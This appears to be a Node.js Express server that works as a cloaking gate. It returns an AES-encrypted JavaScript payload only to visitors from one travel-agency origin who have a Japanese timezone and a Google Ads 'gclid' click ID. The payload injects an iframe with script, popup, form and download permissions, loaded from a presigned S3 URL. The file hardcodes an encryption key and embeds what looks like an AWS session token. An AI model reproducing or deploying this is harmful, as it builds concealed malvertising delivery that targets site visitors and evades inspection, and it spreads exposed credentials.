const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");

const ENCRYPTION_KEY =
  process.env.ENCRYPTION_KEY ||
  "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";

const app = express();
const PORT = process.env.PORT || 3000;

const ALLOWED_ORIGINS = new Set(["https://ayakotravel.agency"]);

const JAPANESE_TIMEZONES = new Set([
  "Asia/Tokyo",
  "Japan",
  "JST",
  "GMT+9",
  "UTC+9",
  "+09:00",
  "+0900",
]);

app.use(cors());
app.use(express.json());

function isJapaneseTimezone(tz) {
  if (!tz || typeof tz !== "string") return false;

  const normalized = tz.trim();

  if (JAPANESE_TIMEZONES.has(normalized)) return true;

  try {
    const fmt = new Intl.DateTimeFormat("en", {
      timeZone: normalized,
      timeZoneName: "shortOffset",
    });
    const offsetPart = fmt
      .formatToParts(new Date())
      .find((p) => p.type === "timeZoneName");

    if (offsetPart) {
      const raw = offsetPart.value.replace("GMT", "").replace(":", "");
      const hours = parseInt(raw, 10);
      if (hours === 9) return true;
    }
  } catch {
    // Unknown timezone string — fall through to false
  }

  return false;
}

function hasGclid(fullUrl) {
  if (!fullUrl || typeof fullUrl !== "string") return false;
  try {
    const url = new URL(fullUrl);
    const gclid = url.searchParams.get("gclid");
    return typeof gclid === "string" && gclid.length > 0;
  } catch {
    return false;
  }
}

/**
 * POST /timezone
 *
 * Body (JSON):
 *   { "timezone": "Asia/Tokyo", "fullUrl": "https://.../?gclid=..." }
 *
 * Responses:
 *   200 { payload: "<encrypted-string>" } — all checks passed
 *   400 { error: "..." }                  — validation / check failures
 *   403 { error: "Origin not allowed" }   — origin not whitelisted
 */
app.post("/timezone", (req, res) => {
  const { timezone, fullUrl } = req.body || {};

  const origin = req.headers.origin;
  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    return res.status(403).json({ error: "Origin not allowed" });
  }

  if (!isJapaneseTimezone(timezone)) {
    return res
      .status(400)
      .json({ error: "Timezone is not a Japanese timezone (JST / UTC+9)" });
  }

  if (!hasGclid(fullUrl)) {
    return res
      .status(400)
      .json({ error: "fullUrl is missing gclid parameter" });
  }

  const encrypted = encodeURIComponent(
    CryptoJS.AES.encrypt(buildPayload(), ENCRYPTION_KEY).toString(),
  );
  return res.status(200).json(encrypted);
});

function buildPayload() {
  return `const iframe = document.createElement("iframe");
iframe.src =
  "https://ap-1777315817703-0018a52f-2788-654654618464.s3-accesspoint.ap-northeast-1.amazonaws.com/index.html?response-content-disposition=inline&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEwaDmFwLW5vcnRoZWFzdC0xIkYwRAIgMyIdNGjZu%2FmElThOgaS1UGqVccZrPMNm1B43baw2uf4CIG8%2FdLwwQ5JmNkB%2BKESKqQwzX19NTFRynTtWU%2BOWQNoEKrkDCBUQABoMNjU0NjU0NjE4NDY0IgxLRjQcxnw%2Bu70kf5sqlgNp9kKX3r2nnhcZNJXES%2F2F0u%2BAlpqCFXCjPI%2Fk15QstjtBDFWFXkvCemaR9tSms19CrQsx7C%2BuByv7PSCTnekHtpn96Cno2MHSNUkEvRix2U6tjIHMEDrFUyBkb5OI3vpV3kXfdt1OYAiCIURmCBbQp7fNw6s0D%2BsLbHGzdpr2BhXGl%2FkhyNjof7%2FNOTC7i6psPpWXpIwMaiYt%2FO1O%2BZoRIf14vhSd1BRAtsig7v2TVmHDzKUH1TjRYhGtAh19Mv%2BQH9w7HnITP5kJOj52ovkW%2BvppwsaP3kjdruyFuUCZIrPK1A2%2FGwf6ha3osoIzqRhov3fpRVyaoQhfJTJeWSmg4HdALirOhNDOJnlxbExCu%2F3SyaW5Sbd3tQCSCGyBaI6yCLqLlTed1MnmL3L%2FvdDzUX%2BYTAOp2rY4H87Wm8%2FhQnTMF7aHV46%2FnZgTVpsng3bFQp24T9KE0TCK%2FAQ6efoNjEVSU2PlMgmzHmXbIE6Q410ZQIKzr11ncMIrARScfOiKgbPJ6uFMFJSwhslmAchu6UPdel5FMMO2zM8GOt8C%2FbZoncFm3tBD5IA4P%2F%2FXaNbLG1bwhwMEwhkmcaaugmv%2B2O69B0OHvFIWkC3Pi1DrkPZ7hqimqmC%2BaUML0CiZeYywtqnfkcBSJV7am%2FxSDd8T4CEUN2Buno5ezXRkh6EV9YnuwhLxQfqKJ5S8deOt16UEF6ayNkL9mubbcy05q6vl3fL0GN3QgfiNiC3%2B6nalRt9MmpZ371yIkPAM7xDTqk9rMih2HFwkRmPVma9wx8xP8jL%2BxvDlPOu%2BNYa3lDiDJmMthnXS%2BaXkrMXUNB5h5rt0K4cFS2OwRYfHpzPDa6VAkyKJLjsuM0hjB0liIhd2lIzdniGxgafTLSoXz3mXpCSPT3HZAZqIXGCB6CeeKGjbihQwcC3%2Fy9TLfnqvBb92YUE0CHkhIp45XSm50NjntQcKh%2BPEPT5A0P8mHszJMVrpK%2FJMm8g6V3gBg%2BSvgaCtYozQ1anJIjEXfm25hpAA&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAZQ3DUXNQCESEVSJD%2F20260430%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20260430T201421Z&X-Amz-Expires=43200&X-Amz-SignedHeaders=host&X-Amz-Signature=2ba554295b56c841652ea9e6ae17d76811d20d73767bb1fdeb0bdaaead205960";

iframe.setAttribute(
  "allow",
  "fullscreen; autoplay; encrypted-media; picture-in-picture",
);

iframe.setAttribute("allowfullscreen", "");
iframe.setAttribute("webkitallowfullscreen", "");
iframe.setAttribute("mozallowfullscreen", "");

iframe.setAttribute(
  "sandbox",
  "allow-scripts allow-popups allow-forms allow-downloads",
);

iframe.style.width = "100%";
iframe.style.height = "100%";
iframe.style.border = "0px";

const container = document.getElementById("contentiframe");
if (container) {
  container.replaceChildren(iframe);
}`;
}

app.get("/health", (_req, res) => res.json({ status: "ok" }));

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
